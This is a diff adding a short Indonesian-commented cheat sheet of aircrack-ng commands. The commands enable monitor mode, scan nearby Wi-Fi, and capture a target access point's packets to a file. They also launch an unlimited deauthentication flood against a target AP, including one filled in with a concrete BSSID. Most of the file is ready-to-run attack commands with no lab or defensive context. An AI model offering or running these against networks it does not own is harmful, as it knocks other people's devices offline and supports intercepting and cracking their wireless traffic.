@@ -1,0 +1,24 @@
+# start mode monitor 
+sudo airmon-ng start wlan0
+
+# stop mode monitor 
+sudo airmon-ng stop wlan0
+
+# jika sudah dalam mode monitor 
+# Melihat atau monitor wifi sekitar
+sudo airodump-ng wlan0mon
+
+# Jika anda ingin menangkap paket wifi target ini perintah nya
+sudo airodump-ng -c <channel> --bssid <BSSID> -w <output_file> wlan0mon
+## ini contoh nya
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w hasil-capture wlan0mon
+
+
+# Jika anda ingin memutuskan jaringan AP target ini perintah nya
+sudo iwconfig wlan0mon channel 6
+sudo aireplay-ng --deauth 0 -a [BSSID_ANDA] wlan0mon
+sudo aireplay-ng --deauth 0 -a EC:E7:A2:47:FF:38 wlan0mon
+
+
+# Perintah ini untuk Menghentikan Proses yang Konflik 
+airmon-ng check kill
